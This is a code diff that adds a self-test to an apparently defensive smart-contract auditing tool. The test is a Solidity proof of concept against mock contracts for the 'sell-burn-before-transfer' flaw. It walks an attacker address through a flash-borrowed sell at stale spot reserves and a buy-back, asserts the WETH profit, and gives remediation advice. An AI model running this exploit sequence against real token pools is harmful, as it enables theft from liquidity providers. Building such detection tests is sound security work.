@@ -900,3 +900,88 @@ def run_exclusion_self_test(rpc_url: str, out_dir: Path) -> dict:
         "previously-excluded collateral.",
         "Never conditionally exclude collateral from share valuation; value all assets consistently, or lock "
         "the threshold so it cannot be crossed by a depositor in the same position.")
+
+
+# ---- #7 Sell-burn-before-transfer (SC02, TENDRIL pattern) ----
+# The deflationary token burns from the pair and syncs reserves BEFORE the seller's tokens are counted,
+# so the sale is priced against stale reserves (no slippage applied). An attacker flash-borrows tokens,
+# sells into that transient imbalance (priced at spot), buys the tokens back with real slippage, and keeps
+# the WETH difference. Safe variant prices the sale with proper AMM slippage -> round trip nets ~0.
+_SELLBURN_SELFTEST = """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+import {Test, console2} from "forge-std/Test.sol";
+
+contract MockERC20 {
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+    function mint(address to, uint256 a) external { balanceOf[to] += a; }
+    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
+    function transfer(address to, uint256 a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
+    function transferFrom(address f, address to, uint256 a) external returns (bool) {
+        if (allowance[f][msg.sender] != type(uint256).max) allowance[f][msg.sender] -= a;
+        balanceOf[f] -= a; balanceOf[to] += a; return true;
+    }
+}
+
+contract Pool {
+    MockERC20 public token; MockERC20 public weth;
+    uint256 public reserveToken; uint256 public reserveWeth;
+    bool public immutable priceAtSpot;   // vuln: burn-before-transfer -> sale priced at stale (spot) reserves
+    constructor(MockERC20 t, MockERC20 w, bool v) { token = t; weth = w; priceAtSpot = v; }
+    function init(uint256 rt, uint256 rw) external { reserveToken = rt; reserveWeth = rw; }
+    function sell(uint256 amtIn) external returns (uint256 wethOut) {
+        token.transferFrom(msg.sender, address(this), amtIn);
+        if (priceAtSpot) wethOut = amtIn * reserveWeth / reserveToken;                     // bug: no slippage
+        else wethOut = reserveWeth - (reserveToken * reserveWeth) / (reserveToken + amtIn); // proper AMM
+        reserveToken += amtIn; reserveWeth -= wethOut;
+        weth.transfer(msg.sender, wethOut);
+    }
+    function buyExact(uint256 tokOut) external returns (uint256 wethIn) {
+        wethIn = (reserveWeth * tokOut) / (reserveToken - tokOut) + 1;
+        weth.transferFrom(msg.sender, address(this), wethIn);
+        reserveWeth += wethIn; reserveToken -= tokOut;
+        token.transfer(msg.sender, tokOut);
+    }
+}
+
+contract PoC is Test {
+    uint256 constant EXPECTED_CHAINID = 1;
+    function setUp() public { require(block.chainid == EXPECTED_CHAINID, "fork guard"); }
+    function test_sell_burn() public {
+        MockERC20 token = new MockERC20(); MockERC20 weth = new MockERC20();
+        Pool pool = new Pool(token, weth, __VULN__);
+        token.mint(address(pool), 1000 ether); weth.mint(address(pool), 1000 ether); pool.init(1000 ether, 1000 ether);
+        address attacker = address(0xA11CE);
+        uint256 amtIn = 100 ether;
+        token.mint(attacker, amtIn);          // flash-borrowed tokens (bought back below to repay)
+        weth.mint(attacker, 100 ether);       // stake to fund the buy-back
+        uint256 bef = weth.balanceOf(attacker);
+        vm.startPrank(attacker);
+        token.approve(address(pool), type(uint256).max); weth.approve(address(pool), type(uint256).max);
+        pool.sell(amtIn);                     // sell into the transient imbalance
+        pool.buyExact(amtIn);                 // buy the tokens back (repay the flash)
+        vm.stopPrank();
+        uint256 aft = weth.balanceOf(attacker);
+        console2.log("CHAIN_PROFIT_WEI", int256(aft) - int256(bef));
+        assertGt(aft, bef, "no profit: sell-burn transient imbalance netted nothing");
+    }
+}
+"""
+
+
+def build_sellburn_selftest_sol(vulnerable: bool) -> str:
+    """Sell-burn-before-transfer: vulnerable (sale priced at stale reserves) or safe (proper AMM slippage)."""
+    return _SELLBURN_SELFTEST.replace("__VULN__", "true" if vulnerable else "false")
+
+
+def run_sellburn_self_test(rpc_url: str, out_dir: Path) -> dict:
+    return _pattern_selftest(
+        rpc_url, out_dir, "sell_burn", "selftestburn", "test_sell_burn",
+        build_sellburn_selftest_sol,
+        "Sell-burn-before-transfer prices a sale against stale reserves",
+        "The token burns from the pair and syncs reserves before the seller's tokens are counted, so a sale "
+        "is priced against stale (pre-transfer) reserves with no slippage. The attacker flash-borrows tokens, "
+        "sells into that transient imbalance at spot price, and buys them back with real slippage, keeping the "
+        "WETH difference.",
+        "Transfer the seller's tokens in and sync reserves BEFORE pricing / burning; never price a trade "
+        "against reserves that do not yet reflect the inbound transfer.")
